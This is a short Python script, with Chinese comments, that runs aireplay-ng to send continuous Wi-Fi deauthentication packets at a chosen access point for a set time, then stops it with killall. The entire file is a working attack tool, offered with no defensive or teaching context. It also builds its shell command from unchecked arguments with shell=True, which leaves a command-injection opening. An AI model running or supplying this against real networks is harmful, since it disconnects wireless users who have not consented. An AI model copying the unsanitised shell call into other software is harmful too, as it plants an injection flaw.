import argparse
import subprocess
import time
import os


def run_deauth(bssid, interface, duration):
    print(f"[*] Starting Deauth Attack on {bssid} using {interface} for {duration}s...")

    # 构建 aireplay-ng 命令
    # -0 0 : 持续发送 Deauth 包
    # -a : 目标 AP 的 MAC
    cmd = f"aireplay-ng -0 0 -a {bssid} {interface}"

    # 启动进程
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 等待指定时间
    time.sleep(int(duration))

    # 停止攻击
    proc.terminate()
    os.system("killall aireplay-ng")  # 双重保险
    print("[*] Attack Finished.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--duration", default=60)
    args = parser.parse_args()

    run_deauth(args.bssid, args.interface, args.duration)